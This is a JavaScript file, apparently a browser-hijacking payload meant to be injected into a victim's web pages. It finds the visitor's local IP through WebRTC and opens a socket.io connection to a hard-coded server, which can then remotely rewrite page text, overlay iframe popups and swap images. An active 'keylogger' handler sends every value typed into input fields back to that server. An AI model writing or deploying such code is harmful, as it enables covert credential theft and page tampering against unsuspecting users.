/*
  Include function
  Includes external js files within a javascript file
  -> filename: the url to the file
  -> onload: callback function on the script's load
*/
function include(filename, onload) {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.src = filename;
    script.type = 'text/javascript';
    script.onload = script.onreadystatechange = function() {
        if (script.readyState) {
            if (script.readyState === 'complete' || script.readyState === 'loaded') {
                script.onreadystatechange = null;                                                  
                onload();
            }
        } 
        else {
            onload();          
        }
    };
    head.appendChild(script);
}
    
//finding client's local IP (could not find any way to retrieve it with node.. dunno why..)
var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})
findIP.then(function(result) {

  //Including jquery in case if the client's webpage does not use it
  include('http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js', function() {
      $(document).ready(function() {
          //Injecting the socket.io script within the client's webpage
          $.getScript('http://192.168.43.248:5001/socket.io/socket.io.js', function() {

            //Creating client's socket
            var socket = io("http://192.168.43.248:5001");

            //Sending client's IP to the server
            socket.emit('client_connected',{"ip":result});

            /*
              Replace text plugin
              Replaces text on the client's machine
              -> original: the string to be replace
              -> replacement: the replacement string
            */
            socket.on('replaceText',function(data){
                original = new RegExp(data.original,"g");
                document.body.innerHTML = document.body.innerHTML.replace(original,data.replacement);
            });

            /*
              Display popup plugin
              Displays a popup on the client's machine
              -> htmlPopup: the html definition of the popup
            */
            socket.on('displayPopup',function(data){
                $('body').append('<iframe style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:50%;height:50%;background:transparent;border:none;" id="terminal" src="'+data.link+'"></iframe>'); 
            });

            socket.on('replaceImages',function(data){
              var imgs = document.getElementsByTagName("img");
              for(var i=0, l=imgs.length;i<l;i++){
                imgs[i].src = data.link;
              }
            });

            /*$(document).bind('keydown',function(e){
             // alert($(":input").val());
              socket.emit('keylogger',{"key":$("input")[0].val()});
            });*/
            $("input").on('input',function(){
              socket.emit('keylogger',{"id":$(this).attr("name"),"value":$(this).attr("name")+": "+$(this).val()});
            });

          });
      });
  });
});

